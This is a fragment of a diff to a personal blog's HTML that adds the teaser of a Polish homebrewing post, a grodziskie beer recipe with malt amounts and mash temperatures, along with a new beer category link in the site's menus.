+                <p>Piwo grodziskie na bazie zestawu kupionego w Centrum piwowarstwa. Data nastawienia: 2013-05-11 Data butelkowania: 2013-05-27 Litraż: ~21l --- do butelek trafiło tylko ok 13 litrów -- reszta gdzieś zniknęła w trakcie. Skład Słód pszeniczny 1,30 kg Słód wędzony 0,70 kg Słód pilzneński 0,50 kg Chmiel Lubelski, granulat, 50 g Drożdże Safbrew S-33 Zacieranie 2,5 * 3 = 7,5l Zacieranie infuzyjne zstępujące 69 stopni do 60 w ciągu 60-90min i podgrzenie do 78 stopni. wysładzanie: 16,5l = 3*4l + 1x4,5l Po wysładzaniu ok 9blg. Po chmieleniu 10blg. Po fermentacji burzliwej:...</p>
+                <a href="/1-grodziskie-osada-dymow.html">Read More</a>
                 <hr class="uk-article-divider">
         </article>
 
@@ -506,6 +887,7 @@ endobj
                     <li class="uk-nav-header">Categories</li>
                     <li ><a href="/category/food-pl.html">Food [PL]</a></li>
                     <li ><a href="/category/hackthebox.html">HackTheBox</a></li>
+                    <li ><a href="/category/piwo-pl.html">Piwo [PL]</a></li>
                     <li ><a href="/category/python.html">Python</a></li>
                     <li ><a href="/category/snippets.html">Snippets</a></li>
                     <li class="uk-nav-header">Pages</li>
@@ -576,6 +958,7 @@ endobj
             <li class="uk-nav-header">Categories</li>
             <li ><a href="/category/food-pl.html">Food [PL]</a></li>
             <li ><a href="/category/hackthebox.html">HackTheBox</a></li>
+            <li ><a href="/category/piwo-pl.html">Piwo [PL]</a></li>
             <li ><a href="/category/python.html">Python</a></li>
             <li ><a href="/category/snippets.html">Snippets</a></li>
             <li class="uk-nav-header">Pages</li>
